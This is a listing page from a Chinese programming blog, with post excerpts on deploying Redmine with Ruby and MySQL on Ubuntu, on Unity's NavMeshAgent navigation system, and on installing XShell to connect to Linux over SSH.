		Ubuntu 部署 Redmine 安装 ruby sudo apt update sudo apt install ruby-full ruby --version # 查看 ruyby 版本 gem -v # 查看 gem 版本 # gem 更换淘宝源 gem sources --remove https://rubygems.org/ gem sources -a http://ruby.taobao.org/ # gem ruby-china 镜像 gem sources --add https://gems.ruby-china.org/ --remove https://rubygems.org/ 安装 MySQL # 安装 MySQL 服务 sudo apt install mysql-server # 修改 root 密码 ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root_password'; # 初始化密码及一下安全设置，密码强度建议选 2 ，其它项全选 y sudo mysql_secure_installation # 访问 MySQL，不加 sudo 会报错：ERROR 1698 (28000): Access denied for user 'root'@'localhost' sudo mysql -uroot -p # 执行下面 3 条指令 CREATE DATABASE redmine CHARACTER SET utf8mb4; CREATE USER 'redmine'@'localhost' IDENTIFIED BY 'my_password'; GRANT ALL PRIVILEGES ON redmine.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a646b545139ee395ed00d1f1c1be1af2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02283352239e943a54af503b5046fc9d/" rel="bookmark">
			Unity基础笔记（6）—— Unity导航系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity导航系统 一、NavMeshAgent组件 1. 导航系统介绍 首先看两个导航系统的应用：
网络游戏中的自动寻路功能，点击地图上的某个位置，角色自动跑到这个位置RTS 和 Moba 类游戏中鼠标右键点击一个位置，角色自动走向这个位置，并且还具备规避障碍物的能力 以上使用的功能就是导航，或者叫寻路，主要具备两个特点：
以最短路径前往目标规避障碍物 2. 导航烘培 既然要导航，那么必须先确定一张“地图”，确定玩家什么地方可以去、什么地方不能去。
Navigation（导航）面板
功能：导航面板的主要功能就是规划场景中哪里可以去哪里不能去面板：Window -&gt; AI -&gt; Navigation 但是需要导航就必须先简单烘培一下地图才能继续
烘培地图的步骤
选择场景中，将地形、场景相关的游戏物体设置为 Static 模式，这是烘培的前提直接选择子栏目 Bake点击Bake按钮场景中部分区域呈现成蓝色，意味着烘培成功，蓝色就是角色可以前往的地方 3. 核心组件 场景烘培好后，已经确定了哪些地方角色可以前往，但是具体如何进行导航？
这就需要游戏物体身上具有 NavMeshAgent 这个组件，导航代理组件承担具体如何导航的计算。
NavMeshAgent 组件：
添加这个导航代理组件的游戏物体，身上会增加一个圆柱体形状的碰撞体
Agent Type：代理类型，我们在 Navigation 中添加类型，主要是设置这个角色的尺寸Base Offset：碰撞体和角色的高度偏移Speed：导航时的最大移动速度Angular Speed：导航时的最大旋转速度Acceleration：导航刚开始时加速到Speed 需要的程度，越大越快Stopping Distance：距离终点多远则停止Auto Braking：勾选后表示到达目标点或离目标点的距离满足 Stopping Distance 时自动停止，如果不勾选即使到达终点，角色也围着重点转来转去 4. 障碍规避 障碍规避设置（同样在NavMeshAgent 组件中） Radius：碰撞体半径Height：碰撞体高度Quality：躲避障碍物的行为质量，质量越高躲避行为越好，越智能Priority：优先级，范围为 0~99，（0 优先级最高，99 优先级最低），高优先级的 Agent 不会与低优先级的 Agent 进行碰撞。 5. NavMeshAgent 常用属性与方法 导航系统的代码相关操作都有先 using UnityEngine.AI 命名空间
常用方法： navMeshAgent.SetDestination(Vector3 position)：设置导航，填写目标位置 常用属性： navMeshAgent.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02283352239e943a54af503b5046fc9d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0745085ae26c8aa0a0d90ddbdf62bb16/" rel="bookmark">
			XShell下载安装及使用（免费版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、下载 下载地址：
中文官方网站：http://xshellcn.com
但是中文官网不是免费的，有试用期，所以可以去外国官网下免费的
外文官方网址：家庭/学校免费 - NetSarang Website (xshell.com)
访问XShell官网，填写姓名和邮箱即可获取下载地址 二、安装 1. 双击运行XShell安装文件，并点击“下一步”
点击“我接受许可证协议中的条款”，点击下一步
选择你要存放的目标文件夹，点击下一步
直接点安装
p.s
下载之前要到我们的Linux系统开启sshd服务，这个服务监听22号端口。
SSH分客户端openssh-client和openssh-server，如果你只是想登陆别的机器的SSH只需要安装openssh-client（我们所安装的xshell属于ssh客户端，Linux和Mac电脑默认是有安装的，但是Windows没有，所以要sudo apt-get install openssh-client），如果要本机开放SSH服务就要安装openssh-server（意思就是机器的ssh服务必须开启）
三、使用XShell连接Linux服务器 1. XShell初始化界面
点击新建，会弹出新建会话属性的窗口
填写会话信息
点击“连接”
此时已经成功的的连接上了服务器，可以进行正常的命令操作
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/96/">«</a>
	<span class="pagination__item pagination__item--current">97/220</span>
	<a class="pagination__item pagination__item--next btn" href="/page/98/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>